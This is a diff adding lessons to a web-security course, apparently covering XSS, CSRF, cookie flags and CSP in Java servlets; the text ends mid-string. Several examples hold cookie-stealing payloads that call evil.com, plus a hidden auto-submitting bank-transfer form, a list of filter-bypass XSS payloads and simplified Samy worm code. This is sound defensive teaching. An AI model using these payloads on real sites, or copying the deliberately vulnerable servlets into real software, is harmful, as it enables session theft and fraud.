+          "description": "The same search page, now protected with output encoding. The identical attack payload is harmlessly displayed as text.",
+          "difficulty": "beginner",
+          "code": "import javax.servlet.http.*;\nimport java.io.*;\n\npublic class SecureSearchServlet extends HttpServlet {\n    \n    // HTML encoder method\n    private String encodeHTML(String input) {\n        if (input == null) return \"\";\n        return input\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\")\n            .replace(\"'\", \"&#x27;\");\n    }\n    \n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        String query = req.getParameter(\"q\");\n        \n        out.println(\"<html><body>\");\n        out.println(\"<h1>Search Results</h1>\");\n        // SECURE: encode before output!\n        out.println(\"<p>You searched for: \" + encodeHTML(query) + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
+          "output": "Normal: Shows 'You searched for: laptop' (same as before)\nAttack input: <script>alert(document.cookie)</script>\nHTML sent: <p>You searched for: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</p>\nBrowser shows TEXT: '<script>alert(document.cookie)</script>'\nNothing executes! Attack BLOCKED!",
+          "ai_explanation": "The encodeHTML method converts < to &lt; and > to &gt;. The browser sees &lt;script&gt; and displays it as the text '<script>' instead of treating it as a real script tag. The user sees the literal text of the attack payload on screen, but nothing harmful happens.",
+          "ai_challenge": "What if the user input goes inside an HTML attribute like <input value='[INPUT]'>? Would the same encoding work? (Hint: the attacker might use ' to break out of the attribute.)"
+        },
+        {
+          "title": "Example 3: Stored XSS in a Comment System",
+          "description": "A forum where comments are stored in the database and displayed to all visitors. One malicious comment attacks everyone.",
+          "difficulty": "beginner",
+          "code": "// VULNERABLE Comment Display Servlet:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException, SQLException {\n    PrintWriter out = resp.getWriter();\n    out.println(\"<html><body><h1>Comments</h1>\");\n    \n    Statement stmt = conn.createStatement();\n    ResultSet rs = stmt.executeQuery(\"SELECT author, comment FROM comments\");\n    \n    while (rs.next()) {\n        String author = rs.getString(\"author\");\n        String comment = rs.getString(\"comment\");\n        // VULNERABLE: database content goes straight into HTML!\n        out.println(\"<div class='comment'>\");\n        out.println(\"<b>\" + author + \"</b>\");\n        out.println(\"<p>\" + comment + \"</p>\");\n        out.println(\"</div>\");\n    }\n    out.println(\"</body></html>\");\n}\n\n// Attacker submits comment:\n// author: \"Hacker\"\n// comment: \"Great post! <script>new Image().src='http://evil.com?c='+document.cookie</script>\"\n\n// Now EVERY visitor sees:\n// <p>Great post! <script>new Image().src=...</script></p>\n// EVERY visitor's cookies are stolen!",
+          "output": "Every visitor to the comments page:\n1. Sees 'Great post!' as text\n2. Browser silently executes the hidden script\n3. Cookies sent to evil.com\n4. Attacker collects ALL visitors' session cookies\n5. Can impersonate ANY visitor!",
+          "ai_explanation": "Unlike reflected XSS where each victim needs a crafted link, stored XSS attacks everyone automatically. The malicious script is saved in the database and served as part of every page load. This is like poisoning a shared water supply instead of one person's drink.\n\nFix: encode BOTH author and comment before output: out.println(\"<b>\" + encodeHTML(author) + \"</b>\");",
+          "ai_challenge": "The MySpace Samy worm used stored XSS to add the attacker as a friend AND copy the worm to the victim's profile. Can you think of why stored XSS is considered more dangerous than reflected?"
+        },
+        {
+          "title": "Example 4: DOM-Based XSS",
+          "description": "A page where client-side JavaScript reads from the URL and uses innerHTML, creating a vulnerability the server never sees.",
+          "difficulty": "intermediate",
+          "code": "<!-- VULNERABLE HTML page -->\n<html>\n<body>\n    <h1>Welcome Page</h1>\n    <div id=\"greeting\"></div>\n    \n    <script>\n        // Read name from URL hash\n        var name = decodeURIComponent(location.hash.substring(1));\n        // VULNERABLE: innerHTML with untrusted data!\n        document.getElementById('greeting').innerHTML = \n            '<p>Hello, ' + name + '!</p>';\n    </script>\n</body>\n</html>\n\n<!-- Normal use: -->\n<!-- URL: http://site.com/welcome#Alice -->\n<!-- Shows: Hello, Alice! -->\n\n<!-- Attack: -->\n<!-- URL: http://site.com/welcome#<img src=x onerror=alert(document.cookie)> -->\n<!-- The hash value goes into innerHTML -->\n<!-- Browser creates an img tag with onerror handler -->\n<!-- onerror fires because 'x' is not a valid image -->\n<!-- alert(document.cookie) executes! -->\n\n<!-- SECURE version: -->\n<script>\n    var name = decodeURIComponent(location.hash.substring(1));\n    // SAFE: textContent never interprets HTML\n    document.getElementById('greeting').textContent = \n        'Hello, ' + name + '!';\n</script>",
+          "output": "Vulnerable: Browser renders <img> tag from hash, triggers onerror, executes JavaScript\nSecure: Browser shows literal text '<img src=x onerror=...' as plain text",
+          "ai_explanation": "DOM-based XSS is unique because the attack payload NEVER goes to the server. The URL fragment (after #) is not sent in HTTP requests. The vulnerability is entirely in the client-side JavaScript that reads location.hash and uses innerHTML.\n\nThe fix is simple: use textContent instead of innerHTML. textContent ALWAYS treats the value as plain text, never as HTML.",
+          "ai_challenge": "What other JavaScript properties/methods are dangerous like innerHTML? (Hint: document.write, eval, outerHTML, and insertAdjacentHTML are all risky.)"
+        },
+        {
+          "title": "Example 5: Cookie Theft Attack - Full Chain",
+          "description": "Complete demonstration of how XSS leads to session hijacking: from injection to cookie theft to account takeover.",
+          "difficulty": "intermediate",
+          "code": "// STEP 1: The vulnerable page\n// Servlet includes user input without encoding:\nout.println(\"<p>Welcome, \" + username + \"</p>\");\n\n// STEP 2: Attacker's payload\nString payload = \"<script>\" +\n    \"var img = new Image();\" +\n    \"img.src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);\" +\n    \"</script>\";\n\n// STEP 3: What the victim's browser receives:\n// <p>Welcome, <script>\n//   var img = new Image();\n//   img.src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);\n// </script></p>\n\n// STEP 4: Browser executes the script:\n// document.cookie = \"JSESSIONID=a1b2c3d4e5; theme=dark; lang=en\"\n// Browser loads: http://evil.com/steal?cookie=JSESSIONID%3Da1b2c3d4e5%3B%20theme%3Ddark\n\n// STEP 5: Attacker's server log:\n// [2024-01-15 14:32:01] GET /steal?cookie=JSESSIONID%3Da1b2c3d4e5 from 192.168.1.50\n\n// STEP 6: Attacker uses the stolen cookie:\n// In browser dev tools: document.cookie = \"JSESSIONID=a1b2c3d4e5\"\n// Refreshes the page -> logged in as the victim!\n\n// DEFENCE:\n// Set-Cookie: JSESSIONID=a1b2c3d4e5; HttpOnly; Secure; SameSite=Strict\n// With HttpOnly: document.cookie returns \"theme=dark; lang=en\" (NO session ID!)\n// Attack fails: attacker gets theme and language but NOT the session",
+          "output": "Without HttpOnly: Attacker steals JSESSIONID -> full account takeover\nWith HttpOnly: Attacker only gets non-sensitive cookies -> session safe",
+          "ai_explanation": "This shows the complete attack chain: XSS injection -> script execution -> cookie reading -> data exfiltration -> session hijacking. The Image trick is used because loading an image does not require any special permissions - the browser just makes an HTTP request to the attacker's server with the cookies in the URL.\n\nHttpOnly breaks the chain at step 4: document.cookie cannot read the JSESSIONID, so the attacker gets nothing useful.",
+          "ai_challenge": "Even with HttpOnly, XSS can still do damage. Name three things an XSS script can do WITHOUT stealing cookies. (Hint: page defacement, phishing forms, keylogging.)"
+        },
+        {
+          "title": "Example 6: CSRF Attack on a Bank Transfer",
+          "description": "How an attacker tricks a victim's browser into making an unwanted bank transfer using a hidden auto-submitting form.",
+          "difficulty": "intermediate",
+          "code": "// The victim is logged into bank.com (has JSESSIONID cookie)\n\n// ATTACKER'S MALICIOUS PAGE (hosted on evil.com):\n// <html>\n// <body onload=\"document.forms[0].submit()\">\n//   <h1>You won a prize! Click to claim...</h1>\n//   <form action=\"https://bank.com/transfer\" method=\"POST\" style=\"display:none\">\n//     <input type=\"hidden\" name=\"to_account\" value=\"ATTACKER_ACCT_789\">\n//     <input type=\"hidden\" name=\"amount\" value=\"5000\">\n//   </form>\n// </body>\n// </html>\n\n// WHAT HAPPENS:\n// 1. Victim clicks link to evil.com (attracted by \"prize\" message)\n// 2. Page loads, onload triggers form.submit()\n// 3. Browser sends POST to bank.com/transfer\n//    - Automatically includes bank.com cookies (JSESSIONID!)\n//    - POST body: to_account=ATTACKER_ACCT_789&amount=5000\n// 4. Bank server receives the request:\n//    - Valid JSESSIONID? YES (victim is logged in)\n//    - Transfer $5000 to ATTACKER_ACCT_789? DONE!\n// 5. Victim just lost $5000\n\n// VULNERABLE bank servlet (no CSRF protection):\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    String toAccount = req.getParameter(\"to_account\");\n    int amount = Integer.parseInt(req.getParameter(\"amount\"));\n    // No CSRF token check! Just trusts the session cookie.\n    transferMoney(getLoggedInUser(req), toAccount, amount);\n}",
+          "output": "Victim visits evil.com -> hidden form auto-submits to bank.com\nBank sees valid session cookie -> processes the transfer\nVictim loses $5000 without knowing!",
+          "ai_explanation": "The CSRF attack exploits the fact that browsers automatically attach cookies to every request for a domain. The victim's browser sends the JSESSIONID cookie with the forged POST request because it is going to bank.com. The bank has no way to distinguish this from a legitimate transfer.\n\nThe fix: require a CSRF token that the attacker's page cannot know.",
+          "ai_challenge": "Why does the SameSite=Strict cookie flag help prevent CSRF? (Hint: with Strict, the cookie is NOT sent when the request comes from a different site.)"
+        },
+        {
+          "title": "Example 7: CSRF Token Implementation",
+          "description": "Complete implementation of CSRF protection in a Java Servlet: token generation, session storage, form embedding, and validation.",
+          "difficulty": "intermediate",
+          "code": "import java.security.SecureRandom;\nimport java.util.Base64;\nimport javax.servlet.http.*;\nimport java.io.*;\n\npublic class SecureTransferServlet extends HttpServlet {\n    \n    // Generate cryptographically random token\n    private String generateToken() {\n        SecureRandom random = new SecureRandom();\n        byte[] bytes = new byte[32];\n        random.nextBytes(bytes);\n        return Base64.getUrlEncoder().encodeToString(bytes);\n    }\n    \n    // GET: Show transfer form WITH CSRF token\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        String token = generateToken();\n        req.getSession().setAttribute(\"csrf_token\", token);\n        \n        PrintWriter out = resp.getWriter();\n        out.println(\"<form action='/transfer' method='POST'>\");\n        out.println(\"<input type='hidden' name='csrf_token' value='\" + token + \"'>\");\n        out.println(\"To: <input name='to_account'>\");\n        out.println(\"Amount: <input name='amount'>\");\n        out.println(\"<button>Transfer</button>\");\n        out.println(\"</form>\");\n    }\n    \n    // POST: Validate CSRF token BEFORE processing\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        String sessionToken = (String) req.getSession().getAttribute(\"csrf_token\");\n        String formToken = req.getParameter(\"csrf_token\");\n        \n        // Validate token\n        if (sessionToken == null || !sessionToken.equals(formToken)) {\n            resp.sendError(403, \"Request rejected - invalid security token\");\n            return;  // STOP! Do not process the transfer.\n        }\n        \n        // Token valid - process the transfer\n        String toAccount = req.getParameter(\"to_account\");\n        int amount = Integer.parseInt(req.getParameter(\"amount\"));\n        transferMoney(getLoggedInUser(req), toAccount, amount);\n        \n        // Invalidate used token (one-time use)\n        req.getSession().removeAttribute(\"csrf_token\");\n    }\n}",
+          "output": "Legitimate request: Token matches -> transfer processed\nCSRF attack: No token or wrong token -> 403 Forbidden, transfer blocked",
+          "ai_explanation": "The CSRF token breaks the attack because:\n1. The token is generated randomly (attacker cannot guess it)\n2. The token is stored in the session (attacker cannot read it)\n3. The token must be in the form submission (attacker's page does not have it)\n4. The Same-Origin Policy prevents the attacker from reading the bank's pages\n\nThe token is also invalidated after use (one-time token), preventing replay attacks.",
+          "ai_challenge": "What happens if the CSRF token is placed in the URL instead of a hidden form field? (Hint: URLs can be leaked through the Referer header, browser history, and server logs.)"
+        },
+        {
+          "title": "Example 8: Secure Cookie Configuration",
+          "description": "Setting all three security flags on session cookies in a Java web application.",
+          "difficulty": "intermediate",
+          "code": "import javax.servlet.http.*;\nimport java.io.*;\n\npublic class SecureLoginServlet extends HttpServlet {\n    \n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        \n        if (authenticate(username, password)) {\n            // Create session\n            HttpSession session = req.getSession(true);\n            session.setAttribute(\"user\", username);\n            session.setMaxInactiveInterval(1800); // 30 min timeout\n            \n            // SECURE the session cookie with ALL flags\n            resp.setHeader(\"Set-Cookie\",\n                \"JSESSIONID=\" + session.getId()\n                + \"; HttpOnly\"      // Block JavaScript access (XSS protection)\n                + \"; Secure\"        // HTTPS only (network protection) \n                + \"; SameSite=Lax\"  // Block cross-site requests (CSRF protection)\n                + \"; Path=/\"        // Valid for entire site\n                + \"; Max-Age=1800\" // 30 min expiry\n            );\n            \n            resp.sendRedirect(\"/dashboard\");\n        } else {\n            resp.sendRedirect(\"/login?error=1\");\n        }\n    }\n}\n\n// WITHOUT flags:\n// Set-Cookie: JSESSIONID=abc123\n// Vulnerable to: XSS cookie theft, HTTP interception, CSRF\n\n// WITH flags:\n// Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=1800\n// Protected against: XSS (HttpOnly), MITM (Secure), CSRF (SameSite)",
+          "output": "Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=1800",
+          "ai_explanation": "Each flag protects against a different attack:\n- HttpOnly: JavaScript (document.cookie) CANNOT read the cookie -> XSS cookie theft blocked\n- Secure: Cookie ONLY sent over HTTPS -> Man-in-the-Middle interception blocked\n- SameSite=Lax: Cookie NOT sent with cross-site form submissions -> CSRF blocked\n- Max-Age: Cookie expires after 30 minutes -> limits window of attack if cookie is somehow stolen",
+          "ai_challenge": "Why use SameSite=Lax instead of SameSite=Strict? (Hint: Strict blocks the cookie even when clicking a link from another site, which breaks legitimate navigation.)"
+        },
+        {
+          "title": "Example 9: Content Security Policy Header",
+          "description": "Adding CSP headers to block inline script execution, providing a safety net even if output encoding is missed.",
+          "difficulty": "intermediate",
+          "code": "import javax.servlet.http.*;\nimport java.io.*;\n\npublic class CSPDemoServlet extends HttpServlet {\n    \n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        // Set CSP header BEFORE any content\n        resp.setHeader(\"Content-Security-Policy\",\n            \"default-src 'self'; \" +\n            \"script-src 'self'; \" +       // Scripts ONLY from our domain\n            \"style-src 'self'; \" +         // Styles ONLY from our domain\n            \"img-src 'self' https:; \" +    // Images from us or any HTTPS\n            \"connect-src 'self'; \" +       // AJAX only to our server\n            \"frame-ancestors 'none'; \" +   // Cannot be embedded in iframes\n            \"form-action 'self'\");          // Forms can only submit to us\n        \n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>CSP Protected Page</h1>\");\n        \n        // Even if XSS gets through:\n        // <script>alert(1)</script>\n        // CSP blocks it! script-src 'self' means ONLY scripts\n        // loaded from our domain are allowed.\n        // Inline scripts are NOT from our domain -> BLOCKED!\n        \n        out.println(\"</body></html>\");\n    }\n}\n\n// Browser console output when XSS is attempted:\n// Refused to execute inline script because it violates the\n// Content Security Policy directive: \"script-src 'self'\".\n// The script was NOT executed.",
+          "output": "With CSP: Inline <script> tags are BLOCKED by the browser\nBrowser console: 'Refused to execute inline script' (CSP violation)\nXSS attack fails even without output encoding!",
+          "ai_explanation": "CSP is a safety net. Even if a developer forgets to encode output somewhere, CSP prevents the injected script from executing. The browser checks every script against the CSP rules before running it.\n\nscript-src 'self' means: only run scripts that are loaded from a file on our own domain. Inline scripts (like those injected by XSS) are NOT from a file on our domain, so they are blocked.\n\nImportant: CSP should be used IN ADDITION to output encoding, not instead of it.",
+          "ai_challenge": "Some applications need inline scripts for functionality. How can CSP allow specific inline scripts while blocking injected ones? (Hint: nonce-based CSP with a random nonce per page load.)"
+        },
+        {
+          "title": "Example 10: XSS in HTML Attributes",
+          "description": "XSS is not just about <script> tags. Attackers can inject into HTML attributes to execute JavaScript via event handlers.",
+          "difficulty": "advanced",
+          "code": "// VULNERABLE: User input in an HTML attribute\nString searchTerm = request.getParameter(\"q\");\nout.println(\"<input type='text' value='\" + searchTerm + \"' placeholder='Search'>\");\n\n// Normal: q=laptop\n// HTML: <input type='text' value='laptop' placeholder='Search'>\n// Works fine!\n\n// Attack: q=' onmouseover='alert(document.cookie)' x='\n// HTML: <input type='text' value='' onmouseover='alert(document.cookie)' x='' placeholder='Search'>\n//       The attacker CLOSED the value attribute with '\n//       Then ADDED an onmouseover event handler\n//       Then started a dummy x=' to consume the remaining quote\n\n// When the victim moves their mouse over the input field:\n// -> onmouseover fires -> alert(document.cookie) executes!\n\n// MORE DANGEROUS PAYLOADS:\n// q=' onfocus='fetch(\"http://evil.com?\"+document.cookie)' autofocus='\n// This auto-focuses the input AND sends cookies immediately!\n\n// DEFENCE:\nString safeValue = encodeHTML(searchTerm);\nout.println(\"<input type='text' value='\" + safeValue + \"' placeholder='Search'>\");\n// The ' becomes &#x27; so the attacker cannot break out of the attribute",
+          "output": "Attack: value='' onmouseover='alert(document.cookie)' x=''\nMouse over input -> alert fires -> cookies exposed!\nWith encoding: value='&#x27; onmouseover=...' -> shows literal text, no execution",
+          "ai_explanation": "XSS is not limited to <script> tags. Attackers can break out of HTML attributes using quotes and add event handlers like onmouseover, onfocus, onerror, onload. Any HTML event handler can execute JavaScript.\n\nThe encoding must convert BOTH < > AND quotes to prevent attribute injection. The &#x27; encoding for single quotes prevents the attacker from closing the attribute.",
+          "ai_challenge": "What about double-quoted attributes? <input value=\"[INPUT]\">. What payload would an attacker use? (Hint: they would use \" instead of ' to close the attribute.)"
+        },
+        {
+          "title": "Example 11: XSS via Image Tags",
+          "description": "Attackers do not need <script> tags. The onerror attribute on <img> tags is a common XSS vector.",
+          "difficulty": "advanced",
+          "code": "// Many applications filter <script> tags but forget about other tags\n\n// VULNERABLE: Simple script tag filter\npublic String weakFilter(String input) {\n    return input.replaceAll(\"<script[^>]*>\", \"\").replaceAll(\"</script>\", \"\");\n}\n\n// Attacker bypasses with <img> tag:\nString payload = \"<img src=x onerror=alert(document.cookie)>\";\n// After filter: <img src=x onerror=alert(document.cookie)>\n// The filter only removes <script> tags!\n\n// OTHER BYPASS PAYLOADS:\n// <svg onload=alert(1)>                    (SVG tag)\n// <body onload=alert(1)>                   (body tag)\n// <iframe src=javascript:alert(1)>         (iframe)\n// <details open ontoggle=alert(1)>         (details tag)\n// <marquee onstart=alert(1)>               (marquee tag)\n// <video><source onerror=alert(1)>         (video tag)\n\n// CORRECT DEFENCE: Output encoding (not filtering)\npublic String encodeHTML(String input) {\n    return input\n        .replace(\"&\", \"&amp;\")\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace(\"\\\"\", \"&quot;\")\n        .replace(\"'\", \"&#x27;\");\n}\n// This works because ALL tags become harmless text\n// <img becomes &lt;img -> displayed as text, never rendered",
+          "output": "Weak filter: blocks <script> but passes <img src=x onerror=alert(1)>\nEncoding: ALL tags become &lt;img&gt; -> displayed as harmless text",
+          "ai_explanation": "There are hundreds of HTML tags and event handlers that can execute JavaScript. Blacklisting specific tags (like only blocking <script>) is a losing game - attackers will always find a tag you forgot.\n\nOutput encoding is the correct approach because it makes ALL tags harmless by converting < to &lt;. No tag of any kind can execute because the browser never sees real HTML tags.",
+          "ai_challenge": "Research three more HTML tags that can execute JavaScript without <script>. (Hint: try <details ontoggle>, <input onfocus autofocus>, <math><mi>)"
+        },
+        {
+          "title": "Example 12: Complete Secure Servlet with All Defences",
+          "description": "A production-ready servlet implementing all seven defence layers: encoding, validation, CSP, cookie flags, CSRF tokens, logging, and error handling.",
+          "difficulty": "advanced",
+          "code": "import javax.servlet.http.*;\nimport java.io.*;\nimport java.security.SecureRandom;\nimport java.util.Base64;\nimport java.util.logging.Logger;\n\npublic class SecureCommentServlet extends HttpServlet {\n    private static final Logger log = Logger.getLogger(\"Security\");\n    \n    private String encodeHTML(String s) {\n        if (s == null) return \"\";\n        return s.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\")\n                .replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\")\n                .replace(\"'\",\"&#x27;\");\n    }\n    \n    private String generateCSRFToken() {\n        byte[] b = new byte[32];\n        new SecureRandom().nextBytes(b);\n        return Base64.getUrlEncoder().encodeToString(b);\n    }\n    \n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        // LAYER 3: CSP Header\n        resp.setHeader(\"Content-Security-Policy\",\n            \"default-src 'self'; script-src 'self'; frame-ancestors 'none'\");\n        \n        // LAYER 4+5: Secure cookies\n        resp.setHeader(\"Set-Cookie\", \"JSESSIONID=\" + req.getSession().getId()\n            + \"; HttpOnly; Secure; SameSite=Lax; Path=/\");\n        \n        // LAYER 6: CSRF Token\n        String token = generateCSRFToken();\n        req.getSession().setAttribute(\"csrf_token\", token);\n        \n        PrintWriter out = resp.getWriter();\n        out.println(\"<form method='POST'>\");\n        out.println(\"<input type='hidden' name='csrf_token' value='\" + token + \"'>\");\n        out.println(\"Comment: <textarea name='comment'></textarea>\");\n        out.println(\"<button>Post</button></form>\");\n        \n        // Display existing comments with LAYER 1: Output Encoding\n        // for (Comment c : getComments()) {\n        //     out.println(\"<p>\" + encodeHTML(c.getText()) + \"</p>\");\n        // }\n    }\n    \n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        // LAYER 6: CSRF Validation\n        String sToken = (String) req.getSession().getAttribute(\"csrf_token\");\n        String fToken = req.getParameter(\"csrf_token\");\n        if (sToken == null || !sToken.equals(fToken)) {\n            log.warning(\"CSRF attempt from \" + req.getRemoteAddr());\n            resp.sendError(403);\n            return;\n        }\n        \n        // LAYER 2: Input Validation\n        String comment = req.getParameter(\"comment\");\n        if (comment == null || comment.length() > 1000) {\n            resp.sendError(400, \"Invalid comment\");\n            return;\n        }\n        \n        // Save to database (use PreparedStatement!)\n        // LAYER 1: Encode on OUTPUT, not on input\n        // Store raw comment, encode when displaying\n        log.info(\"New comment from \" + req.getRemoteAddr());\n    }\n}",
+          "output": "All 7 layers active:\n1. Output encoding on display\n2. Input validation (length check)\n3. CSP blocks inline scripts\n4. HttpOnly prevents cookie theft\n5. Secure flag enforces HTTPS\n6. CSRF token validates form origin\n7. Logging tracks security events",
+          "ai_explanation": "This servlet combines every defence technique into a single, production-ready implementation. Each layer catches what the others might miss:\n- Output encoding stops most XSS\n- CSP catches any encoding mistakes\n- HttpOnly prevents cookie theft even if XSS succeeds\n- CSRF tokens block forged requests\n- Input validation limits what attackers can submit\n- Logging helps detect and investigate attacks",
+          "ai_challenge": "What would you add for a production deployment? (Hint: rate limiting, account lockout, Content-Type headers, X-Frame-Options, X-Content-Type-Options.)"
+        },
+        {
+          "title": "Example 13: XSS Context-Dependent Encoding",
+          "description": "Different HTML contexts require different encoding. HTML body, attributes, JavaScript, CSS, and URLs each need specific treatment.",
+          "difficulty": "advanced",
+          "code": "// CONTEXT MATTERS! The same data needs different encoding\n// depending on WHERE it appears in the HTML.\n\nString userInput = \"Alice <script>alert(1)</script>\";\n\n// CONTEXT 1: HTML Body\n// <p>Hello, [INPUT]</p>\n// Encode: < > & \" '\nout.println(\"<p>Hello, \" + encodeHTML(userInput) + \"</p>\");\n// Output: <p>Hello, Alice &lt;script&gt;alert(1)&lt;/script&gt;</p>\n\n// CONTEXT 2: HTML Attribute\n// <input value=\"[INPUT]\">\n// Encode: \" & < > (to prevent breaking out of attribute)\nout.println(\"<input value=\\\"\" + encodeHTMLAttr(userInput) + \"\\\">\" );\n\n// CONTEXT 3: JavaScript String\n// <script>var name = '[INPUT]';</script>\n// Encode: ' \\ / and use \\uXXXX for special chars\nout.println(\"<script>var name = '\" + encodeJS(userInput) + \"';</script>\");\n\n// CONTEXT 4: URL Parameter\n// <a href=\"/search?q=[INPUT]\">Link</a>\n// Encode: use URL encoding (%XX)\nout.println(\"<a href=\\\"/search?q=\" + encodeURL(userInput) + \"\\\">Link</a>\");\n\n// CONTEXT 5: CSS Value\n// <div style=\"background: [INPUT]\">\n// Encode: escape \\ and use \\HH for non-alphanumeric chars\n// Generally: NEVER put user input in CSS!\n\n// KEY RULE: Use the RIGHT encoding for the RIGHT context.\n// HTML encoding in a JavaScript context does NOT protect you!",
+          "output": "HTML body: &lt;script&gt; (safe)\nAttribute: &quot; prevents breakout (safe)\nJavaScript: \\x3cscript\\x3e (safe)\nURL: %3Cscript%3E (safe)\nEach context needs its own encoding!",
+          "ai_explanation": "This is an advanced but critical concept. The same characters that are safe in one context are dangerous in another. For example, a single quote (') is safe in HTML body context but dangerous in JavaScript string context.\n\nMost frameworks handle this automatically, but if you are writing raw servlet code, you need to know which encoding to apply based on where the data appears in the HTML.",
+          "ai_challenge": "What happens if you use HTML encoding inside a <script> block? Example: <script>var x = '&lt;';</script>. Does the browser decode &lt; back to < inside the script? (Hint: YES it does! HTML entities are decoded before JavaScript sees the value.)"
+        },
+        {
+          "title": "Example 14: Real-World XSS Impact - The Samy Worm",
+          "description": "Analysis of the MySpace Samy worm that infected over 1 million profiles in 20 hours using stored XSS, demonstrating viral propagation.",
+          "difficulty": "advanced",
+          "code": "// THE SAMY WORM (2005) - Fastest spreading worm in history\n// \n// WHAT IT DID:\n// 1. Added Samy as a friend of anyone who viewed his profile\n// 2. Added 'but most of all, samy is my hero' to their profile\n// 3. COPIED ITSELF to the viewer's profile\n// 4. Now anyone who views THAT profile also gets infected!\n//\n// PROPAGATION:\n// Hour 0:  1 infected profile (Samy's)\n// Hour 1:  73 friends added\n// Hour 8:  ~6,000 infected profiles\n// Hour 13: ~200,000 infected profiles  \n// Hour 18: ~800,000 infected profiles\n// Hour 20: ~1,000,000 infected profiles\n// MySpace taken offline to stop the spread!\n\n// SIMPLIFIED WORM LOGIC:\n// <div id=\"mycode\" style=\"background: url('javascript:...')\">\n//   <script>\n//     // Step 1: Get current viewer's info\n//     var token = getCookie('mytoken');\n//     \n//     // Step 2: Add Samy as friend\n//     var xhr1 = new XMLHttpRequest();\n//     xhr1.open('POST', '/friendrequest');\n//     xhr1.send('friendID=samy&token=' + token);\n//     \n//     // Step 3: Copy worm to viewer's profile\n//     var wormCode = document.getElementById('mycode').innerHTML;\n//     var xhr2 = new XMLHttpRequest();\n//     xhr2.open('POST', '/updateprofile');\n//     xhr2.send('description=' + encodeURIComponent(wormCode) + '&token=' + token);\n//   </script>\n// </div>\n\n// WHY IT WORKED:\n// - MySpace allowed HTML in profiles (stored XSS)\n// - No output encoding on profile content\n// - No CSRF tokens (worm could make requests)\n// - The worm was self-replicating (exponential spread)\n\npublic class SamyLessons {\n    public static void main(String[] args) {\n        System.out.println(\"Lessons from the Samy Worm:\");\n        System.out.println(\"1. Output encode ALL user content\");\n        System.out.println(\"2. Use CSRF tokens on ALL actions\");\n        System.out.println(\"3. CSP would have blocked the inline script\");\n        System.out.println(\"4. Rate limiting would have slowed the spread\");\n        System.out.println(\"5. Never allow raw HTML in user profiles\");\n    }\n}",
+          "output": "Lessons from the Samy Worm:\n1. Output encode ALL user content\n2. Use CSRF tokens on ALL actions\n3. CSP would have blocked the inline script\n4. Rate limiting would have slowed the spread\n5. Never allow raw HTML in user profiles",
+          "ai_explanation": "The Samy worm is the most famous XSS attack in history. It demonstrated that stored XSS can be self-replicating: each infected profile becomes a new attack vector. The exponential growth meant MySpace had to take the entire platform offline.\n\nModern defences would prevent this: output encoding stops the script from executing, CSP blocks inline scripts, CSRF tokens prevent the friend-add and profile-update requests, and rate limiting would catch the unusual activity.",
+          "ai_challenge": "If you were designing a social media platform that allows users to post rich content (bold, images, links), how would you allow formatting WITHOUT allowing XSS? (Hint: use a whitelist of allowed HTML tags like <b>, <i>, <img> with sanitised attributes.)"
+        }
+      ],
+      "visual_diagram": {
+        "title": "XSS & Web Security: Attack Types, Defences & Cookie Protection",
+        "content": "<div style=\"font-family: monospace; line-height: 1.6; padding: 10px;\">\n<div style=\"text-align: center; margin-bottom: 20px;\">\n<span style=\"background: #e74c3c; color: white; padding: 8px 20px; border-radius: 6px; font-size: 18px; font-weight: bold;\">XSS & WEB SECURITY: COMPLETE DEFENCE MAP</span>\n</div>\n\n<div style=\"margin-bottom: 25px;\">\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">3 TYPES OF XSS</span>\n<pre style=\"margin-top: 8px;\">\n  <span style=\"color: #e74c3c; font-weight: bold;\">REFLECTED XSS</span> (from URL)\n  Attacker -> crafts malicious URL\n       |-> sends to victim via email/link\n  Victim -> clicks link -> browser sends to server\n  Server -> includes input in HTML (no encoding)\n  Browser -> receives page -> <span style=\"color: #e74c3c;\">RUNS the injected script</span>\n  <span style=\"color: #95a5a6;\">Impact: one victim per crafted link</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">STORED XSS</span> (from database)\n  Attacker -> posts malicious content (comment/profile)\n  Server -> saves to database (no sanitisation)\n  Any User -> views the page\n  Server -> reads from DB -> puts in HTML (no encoding)\n  Browser -> <span style=\"color: #e74c3c;\">RUNS the script for EVERY visitor</span>\n  <span style=\"color: #95a5a6;\">Impact: ALL visitors affected (most dangerous!)</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">DOM-BASED XSS</span> (client-side)\n  Attacker -> crafts URL with payload in hash/fragment\n  Victim -> clicks link\n  Server -> sends normal safe HTML\n  Client JS -> reads URL hash -> uses innerHTML\n  Browser -> <span style=\"color: #e74c3c;\">RUNS injected content from the DOM</span>\n  <span style=\"color: #95a5a6;\">Impact: server never sees the attack payload</span>\n</pre>\n</div>\n\n<div style=\"border-top: 3px dashed #95a5a6; margin: 20px 0;\"></div>\n\n<div style=\"margin-bottom: 25px;\">\n<span style=\"background: #e74c3c; color: white; padding: 